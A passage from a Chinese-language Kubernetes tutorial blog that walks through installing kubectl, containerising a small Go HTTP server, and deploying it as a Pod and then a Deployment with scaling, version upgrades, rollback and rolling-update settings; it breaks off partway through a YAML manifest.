组件设置额外的配置参数。</p></blockquote><p>使用<code>minikube status</code>查看集群状态</p><p><strong>minikube 命令速查</strong></p><p><code>minikube stop</code> 不会删除任何数据，只是停止 VM 和 k8s 集群。</p><p><code>minikube delete</code> 删除所有 minikube 启动后的数据。</p><p><code>minikube ip</code> 查看集群和 docker enginer 运行的 IP 地址。</p><p><code>minikube pause</code> 暂停当前的资源和 k8s 集群</p><p><code>minikube status</code> 查看当前集群状态</p><h2 id="安装-kubectl"><a href="#安装-kubectl" class="headerlink" title="安装 kubectl"></a>安装 kubectl</h2><p>使用以下命令安装：或者安装<a href="https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/#install-using-native-package-management">Debian发行版</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -LO <span class="hljs-string">&quot;https://dl.k8s.io/release/<span class="hljs-subst">$(curl -L -s https://dl.k8s.io/release/stable.txt)</span>/bin/linux/amd64/kubectl&quot;</span> <span class="hljs-comment">#下载最新版</span><br><span class="hljs-built_in">sudo</span> install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl <span class="hljs-comment">#安装kubectl</span><br></code></pre></td></tr></table></figure><p>执行测试，以保障你安装的版本是最新的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl version --client<br></code></pre></td></tr></table></figure><p>或者使用如下命令来查看版本的详细信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl version --client --output=yaml<br></code></pre></td></tr></table></figure><p>通过获取集群状态的方法，检查是否已恰当地配置了 <code>kubectl</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl cluster-info<br></code></pre></td></tr></table></figure><p>如果返回一个 URL，则意味着 kubectl 成功地访问到了你的集群。</p><h2 id="注册-docker-hub-账号登录"><a href="#注册-docker-hub-账号登录" class="headerlink" title="注册 docker hub 账号登录"></a>注册 docker hub 账号登录</h2><p>因为默认 minikube 使用的镜像地址是 DockerHub，</p><p>所以我们还需要在 <a href="https://hub.docker.com/">DockerHub</a> 中注册账号，并且使用 login 命令登录账号。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker login</span><br></code></pre></td></tr></table></figure><p>我这里采用aliyun的镜像托管平替</p><h1 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h1><p>我们的旅程从一段代码开始。新建一个 <code>main.go</code> 文件，复制下面的代码到文件中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>io.WriteString(w, <span class="hljs-string">&quot;[v1] Hello, Kubernetes!&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>上面是一串用 <a href="https://go.dev/">Go</a> 写的代码，代码逻辑非常的简单，首先启动 HTTP 服务器，监听 <code>3000</code> 端口，当访问路由 <code>/</code>的时候 返回字符串 <code>[v1] Hello, Kubernetes!</code>。</p><p>在以前，如果你想将这段代码运行起来并测试一下。你首先需要懂得如何下载 golang 的安装包进行安装，接着需要懂得 <code>golang module</code> 的基本使用，最后还需要了解 golang 的编译和运行命令，才能将该代码运行起来。甚至在过程中，可能会因为环境变量问题、操作系统问题、处理器架构等问题导致编译或运行失败。</p><p>但是通过 Container (容器) 技术，只需要上面的代码，附带着对应的容器 <code>Dockerfile</code> 文件，那么你就不需要 golang 的任何知识，也能将代码顺利运行起来。</p><blockquote><p>Container (容器) 是一种沙盒技术。它是基于 Linux 中 Namespace &#x2F; Cgroups &#x2F; chroot 等技术结合而成，更多技术细节可以参看这个视频 <a href="https://www.youtube.com/watch?v=8fi7uSYlOdc">如何自己实现一个容器</a>。</p></blockquote><p>下面就是 Go 代码对应的 <code>Dockerfile</code>，简单的方案是直接使用 golang 的 alpine 镜像来打包，但是因为我们后续练习需要频繁的推送镜像到 DockerHub 和拉取镜像到 k8s 集群中，为了优化网络速度，我们选择先在 <code>golang:1.16-buster</code> 中将上述 Go 代码编译成二进制文件，再将二进制文件复制到 <code>base-debian10</code> 镜像中运行 (Dockerfile 不理解没有关系，不影响后续教程学习)。</p><p>这样我们可以将 300MB 大小的镜像变成只有 20MB 的镜像，甚至压缩上传到 DockerHub 后大小只有 10MB！</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># Dockerfile</span><br><span class="hljs-keyword">FROM</span> golang:<span class="hljs-number">1.16</span>-buster AS builder<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /src</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> . /src</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /src</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> go <span class="hljs-built_in">env</span> -w GO111MODULE=auto</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> go build -o main .</span><br><br><span class="hljs-keyword">FROM</span> gcr.io/distroless/base-debian10<br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=builder /src/main /main</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">3000</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;/main&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>需要注意 <code>main.go</code> 文件需要和 <code>Dockerfile</code> 文件在同一个目录下，执行下方 <code>docker build</code> 命令，第一次需要耐心等待拉取基础镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t hellok8s:v1<br>docker run -p 3000:3000 --name hellok8s -d hellok8s:v1<br></code></pre></td></tr></table></figure><p>可以看到</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250426232154933.png" alt="image-20250426232154933"></p><p>ps:使用<code>minihube ip</code>给出的ip和实际上的ip不一样，因为 Minikube 在本地创建了一个独立的虚拟化环境（如虚拟机或容器），该环境拥有自己的网络接口和 IP 地址,这种设计使得 Minikube 集群与主机系统在网络上相互隔离，从而避免了潜在的端口冲突和安全问题。</p><h1 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h1><p>如果在生产环境中运行的都是独立的单体服务，那么 Container (容器) 也就够用了，但是在实际的生产环境中，维护着大规模的集群和各种不同的服务，服务之间往往存在着各种各样的关系。而这些关系的处理，才是手动管理最困难的地方。</p><p><strong>Pod</strong> 是我们将要创建的第一个 k8s 资源，也是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元。在了解 <code>pod</code> 和 <code>container</code> 的区别之前，我们可以先创建一个简单的 pod 试试，</p><p>我们先把刚刚的镜像上传到<code>aliyun</code>，我们编写一个yaml来：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># hellok8s.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-pod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v1</span><br>  <span class="hljs-attr">imagePullSecrets:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">阿里云密码</span><br></code></pre></td></tr></table></figure><p>其中 <code>kind</code> 表示我们要创建的资源是 <code>Pod</code> 类型， <code>metadata.name</code> 表示要创建的 pod 的名字，这个名字需要是唯一的。 <code>spec.containers</code> 表示要运行的容器的名称和镜像地址。</p><p>我们运行第一条 k8s 命令 <code>kubectl apply -f hellok8s.yaml</code> 命令来创建 <code>hellok8s</code> Pod。</p><p>我们使用<code>kubectl get pods</code>来查看pod状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kubectl get pods<br>NAME           READY   STATUS             RESTARTS   AGE<br>hellok8s-pod   0/1     running   0          51s<br></code></pre></td></tr></table></figure><p>我们使用<code>kubectl port-forward hellok8s-pod 4000:3000</code>将 镜像的<code>3000</code>端口映射到本机的 <code>4000</code> 端口</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">curl http:<span class="hljs-comment">//127.0.0.1:4000</span><br><span class="hljs-string">[v1]</span> Hello, Kubernetes!<br></code></pre></td></tr></table></figure><h2 id="Pod-与-Container-的不同"><a href="#Pod-与-Container-的不同" class="headerlink" title="Pod 与 Container 的不同"></a>Pod 与 Container 的不同</h2><p>回到 <code>pod</code> 和 <code>container</code> 的区别，我们会发现刚刚创建出来的资源如下图所示，在最内层是我们的服务 <code>hellok8s</code>，运行在 <code>container</code> 容器当中， <code>container</code> (容器) 的本质是进程，而 <code>pod</code> 是管理这一组进程的资源。</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/nginx_pod.png" alt="nginx_pod"></p><p>所以自然 <code>pod</code> 可以管理多个 <code>container</code>，在某些场景例如服务之间需要文件交换(日志收集)，本地网络通信需求(使用 localhost 或者 Socket 文件进行本地通信)，在这些场景中使用 <code>pod</code> 管理多个 <code>container</code> 就非常的推荐。而这，也是 k8s 如何处理服务之间复杂关系的第一个例子，如下图所示：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/pod.png" alt="pod"></p><h2 id="Pod-其它命令"><a href="#Pod-其它命令" class="headerlink" title="Pod 其它命令"></a>Pod 其它命令</h2><p>我们可以通过 <code>logs</code> 或者 <code>logs -f</code> 命令查看 pod 日志，可以通过 <code>exec -it</code> 进入 pod 或者调用容器命令，通过 <code>delete pod</code> 或者 <code>delete -f hellok8s.yaml</code> 的方式删除 pod 资源。这里可以看到 <a href="https://kubernetes.io/docs/reference/kubectl/cheatsheet/">kubectl 所有命令</a>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl logs --follow hellok8s<br>                              <br>kubectl exec hellok8s -- ls<br><br>kubectl delete pod hellok8s<br><span class="hljs-meta prompt_"># </span><span class="language-bash">pod <span class="hljs-string">&quot;hellok8s&quot;</span> deleted</span><br><br>kubectl delete -f hellok8s.yaml<br><span class="hljs-meta prompt_"># </span><span class="language-bash">pod <span class="hljs-string">&quot;hellok8s&quot;</span> deleted</span><br></code></pre></td></tr></table></figure><p>相应的命令如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f hellok8s.yaml<br><br>kubectl get pods<br><br>kubectl port-forward hellok8s 3000:3000<br></code></pre></td></tr></table></figure><p>关于启动失败</p><p>如果查看Pod的状态为 ErrImagePull 或者 ImagePullBackOff</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">NAME       READY   STATUS             RESTARTS   AGE<br>hellok8s   0/1     ImagePullBackOff   0          22m<br></code></pre></td></tr></table></figure><p>如果使用的是docker-hub 尝试切换为当前环境的docker-env, 删除pod, 然后重新构建镜像即可</p><ul><li>官方文档: <a href="https://minikube.sigs.k8s.io/docs/handbook/pushing/">Pushing directly to the in-cluster Docker daemon (docker-env)</a></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">eval $(minikube docker-env)<br></code></pre></td></tr></table></figure><p>如果使用的是三方镜像托管，再检查你的<code>imagePullSecrets</code>字段有没有错误</p><h1 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h1><p>在生产环境中，我们基本上不会直接管理 pod，我们需要 <code>kubernetes</code> 来帮助我们来完成一些自动化操作，例如自动扩容或者自动升级版本。可以想象在生产环境中，我们手动部署了 10 个 <code>hellok8s:v1</code> 的 pod，这个时候我们需要升级成 <code>hellok8s:v2</code> 版本，我们难道需要一个一个的将 <code>hellok8s:v1</code> 的 pod 手动升级吗？</p><p>这个时候就需要我们来看 <code>kubeates</code> 的另外一个资源 <code>deployment</code>，来帮助我们管理 pod</p><h2 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h2><p>首先可以创建一个 <code>deployment.yaml</code> 的文件。来管理 <code>hellok8s</code> pod。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v1</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">阿里云密码</span><br></code></pre></td></tr></table></figure><p>其中 <code>kind</code> 表示我们要创建的资源是 <code>deployment</code> 类型， <code>metadata.name</code> 表示要创建的 deployment 的名字，这个名字需要是<strong>唯一</strong>的。</p><p>在 <code>spec</code> 里面表示，首先 <code>replicas</code> 表示的是部署的 pod 副本数量，<code>selector</code> 里面表示的是 <code>deployment</code> 资源和 <code>pod</code> 资源关联的方式，这里表示 <code>deployment</code> 会管理 (selector) 所有 <code>labels=hellok8s</code> 的 pod。</p><p><code>template</code> 的内容是用来定义 <code>pod</code> 资源的，你会发现和Hellok8s Pod 资源的定义是差不多的，唯一的区别是我们需要加上 <code>metadata.labels</code> 来和上面的 <code>selector.matchLabels</code> 对应起来。来表明 pod 是被 deployment 管理，不用在<code>template</code> 里面加上 <code>metadata.name</code> 是因为 deployment 会主动为我们创建 pod 的唯一<code>name</code>。</p><p>接下来输入下面的命令，可以创建 <code>deployment</code> 资源。通过 <code>get</code> 和 <code>delete pod</code> 命令，我们会初步感受 deployment 的魅力。<strong>每次创建的 pod 名称都会变化，某些命令记得替换成你的 pod 的名称</strong></p><p>当手动删除一个 <code>pod</code> 资源后，deployment 会自动创建一个新的 <code>pod</code>，这和我们之前手动创建 pod 资源有本质的区别！这代表着当生产环境管理着成千上万个 pod 时，我们不需要关心具体的情况，只需要维护好这份 <code>deployment.yaml</code> 文件的资源定义即可</p><p>当我们想要将 <code>hellok8s:v1</code> 的资源扩容到 3 个副本时，只需要将 <code>replicas</code> 的值设置成 3，接着重新输入 <code>kubectl apply -f deployment.yaml</code> 即可</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v1</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">阿里云密码</span><br></code></pre></td></tr></table></figure><p>可以在 <code>kubectl apply</code> 之前通过新建窗口执行 <code>kubectl get pods --watch</code> 命令来观察 pod 启动和删除的记录，想要减少副本数时也很简单，你可以尝试将副本数随意增大或者缩小，再通过 <code>watch</code> 来观察它的状态</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/deployment.png" alt="deployment"></p><h2 id="升级版本"><a href="#升级版本" class="headerlink" title="升级版本"></a>升级版本</h2><p>我们接下来尝试将所有 <code>v1</code> 版本的 <code>pod</code> 升级到 <code>v2</code> 版本。首先我们需要构建一份 <code>hellok8s:v2</code> 的版本镜像。唯一的区别就是字符串替换成了 <code>[v2] Hello, Kubernetes!</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>io.WriteString(w, <span class="hljs-string">&quot;[v2] Hello, Kubernetes!&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>构建好镜像上传到aliyun，改变deployment的镜像为v2</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v2</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">阿里云密码</span><br><br></code></pre></td></tr></table></figure><p>应用这个deployment，使用这个命令<code>kubectl describe pod id</code>看到镜像是v2版本的，</p><p>使用<code>kubectl port-forward hellok8s-deployment-7b46d8bd86-2v9g4 4000:3000</code></p><p>看到是输出<code>[v2] Hello, Kubernetes!</code></p><h2 id="Rolling-Update-滚动更新"><a href="#Rolling-Update-滚动更新" class="headerlink" title="Rolling Update(滚动更新)"></a>Rolling Update(滚动更新)</h2><p>如果我们在生产环境上，管理着多个副本的 <code>hellok8s:v1</code> 版本的 pod，我们需要更新到 <code>v2</code> 的版本，像上面那样的部署方式是可以的，但是也会带来一个问题，就是所有的副本在同一时间更新，这会导致我们 <code>hellok8s</code> 服务在短时间内是不可用的，因为所有 pod 都在升级到 <code>v2</code> 版本的过程中，需要等待某个 pod 升级完成后才能提供服务。</p><p>这个时候我们就需要滚动更新 (rolling update)，在保证新版本 <code>v2</code> 的 pod 还没有 <code>ready</code> 之前，先不删除 <code>v1</code> 版本的 pod。</p><p>在 deployment 的资源定义中, <code>spec.strategy.type</code> 有两种选择:</p><ul><li><strong>RollingUpdate:</strong> 逐渐增加新版本的 pod，逐渐减少旧版本的 pod。</li><li><strong>Recreate:</strong> 在新版本的 pod 增加前，先将所有旧版本 pod 删除。</li></ul><p>大多数情况下我们会采用滚动更新 (RollingUpdate) 的方式，滚动更新又可以通过 <code>maxSurge</code> 和 <code>maxUnavailable</code> 字段来控制升级 pod 的速率，具体可以详细看<a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/deployment/">官网定义</a>。：</p><ul><li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#max-surge"><strong>maxSurge:</strong></a> 最大峰值，用来指定可以创建的超出期望 Pod 个数的 Pod 数量。</li><li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#max-unavailable,"><strong>maxUnavailable:</strong></a> 最大不可用，用来指定更新过程中不可用的 Pod 的个数上限。</li></ul><p>我们先输入命令回滚我们的 deployment，输入 <code>kubectl describe pod</code> 会发现 deployment 已经把 <code>v2</code> 版本的 pod 回滚到 <code>v1</code> 的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#回滚到上版本</span><br>kubectl rollout undo deployment hellok8s-deployment<br><br>kubectl get pods<br>NAME                                   READY   STATUS    RESTARTS   AGE<br>hellok8s-deployment-74fb85d55c-976mz   1/1     Running   0          14s<br>hellok8s-deployment-74fb85d55c-l6p5q   1/1     Running   0          11s<br>hellok8s-deployment-74fb85d55c-qbd4w   1/1     Running   0          9s<br><br><span class="hljs-comment">#查看pod详细信息</span><br>kubectl describe pod hellok8s-deployment-74fb85d55c-976mz<br>Image:          crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v1<br></code></pre></td></tr></table></figure><p>除了上面的命令，还可以用 <code>history</code> 来查看历史版本，<code>--to-revision=2</code> 来回滚到指定版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl rollout history deployment hellok8s-deployment<br>kubectl rollout undo deployment/hellok8s-deployment --to-revision=2<br></code></pre></td></tr></table></figure><p>接着设置 <code>strategy=rollingUpdate</code> , <code>maxSurge=1</code> , <code>maxUnavailable=1</code> 和 <code>replicas=3</code> 到 deployment.yaml 文件中。这个参数配置意味着最大可能会创建 4 个 hellok8s pod (replicas + maxSurge)，最小会有 2 个 hellok8s pod 存活 (replicas - maxUnavailable)</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> apps<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Deployment<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> hellok8s-deployment<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">strategy:</span><br>     <span class="hljs-params">rollingUpdate:</span><br>      <span class="hljs-params">maxSurge:</span> <span class="hljs-number">1</span><br>      <span class="hljs-params">maxUnavailable:</span> <span class="hljs-number">1</span><br>  <span class="hljs-params">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-params">selector:</span><br>    <span class="hljs-params">matchLabels:</span><br>      <span class="hljs-params">app:</span> hellok8s<br>  <span class="hljs-params">template:</span><br>    <span class="hljs-params">metadata:</span><br>      <span class="hljs-params">labels:</span><br>        <span class="hljs-params">app:</span> hellok8s<br>    <span class="hljs-params">spec:</span><br>      <span class="hljs-params">containers:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> hellok8s-container<br>          <span class="hljs-params">image:</span> crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com<span class="hljs-operator">/</span>xpshub<span class="hljs-operator">/</span>k8s:v2<br>      <span class="hljs-params">imagePullSecrets:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> 